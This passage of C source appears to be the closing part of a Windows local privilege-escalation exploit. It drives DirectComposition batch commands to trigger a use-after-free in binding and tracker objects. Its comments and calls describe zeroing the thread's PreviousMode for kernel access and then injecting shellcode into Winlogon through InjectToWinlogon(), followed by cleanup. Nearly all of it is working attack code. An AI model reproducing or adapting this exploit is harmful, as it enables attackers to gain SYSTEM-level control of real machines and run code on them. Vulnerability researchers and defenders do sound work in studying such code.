 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + 12, &dwArg1, &dwArg2); // Set binding property
 if (ntStatus != 0)
 {
  printf("error!\n");
  return 0;
 }

 
 // Serialize batch commands and sends them to dwm.exe through ALPC.
 // Triggering EmitUpdateCommands during serialization.
 // Freed object(tracker1, tracker2) will get referenced in the process, which leads to UAF.
 NtDCompositionCommitChannel(hChannel, &dwArg1, &dwArg2, 0, p);
 // In palette1, _KTHREAD->PreviousMode = 0 to inject shellcode into Winlogon process for EoP.
 // (0 = Kernel Mode, 1 = User Mode)
 // In palette2, allow kernel access through kernel access token

 //getc(stdin);
 InjectToWinlogon();  // Inject shellcode into Winlogon

 RestoreStatus();  // Restore some status, change process to user mode

 /* After this part is unneccesary. Why??? */
 /* Just releasing resources */
 // Release BindingManager
 *(DWORD*)pMappedAddress = nCmdReleaseResource;  // 0x03
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)1; // CInteractionTrackerBindingManagerMarshaler
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;   // 0x08
 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2); // Release binding object

 // Release tracker3
 *(DWORD*)pMappedAddress = nCmdReleaseResource;  // 0x03
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)4; // tracker3
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;   // 0x08
 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2); // Release tracker3
 
 return 0;
}
